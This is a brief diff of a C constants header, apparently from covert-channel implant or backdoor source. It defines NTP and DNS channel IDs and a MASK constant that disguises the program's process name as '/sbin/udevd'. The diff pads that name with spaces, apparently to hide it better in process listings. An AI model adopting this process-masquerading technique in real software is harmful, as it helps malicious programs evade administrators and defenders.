@@ -36,7 +36,7 @@ NOTES: This file holds the constants used throughout the program.
 #define CHAN_NTP 1
 #define CHAN_DNS 2
 
-#define MASK 	"/sbin/udevd"
+#define MASK 	"/sbin/udevd                        "
 
 #define ETHER_IP_UDP_LEN 44
 #define ETHER_HEADER_LEN 16
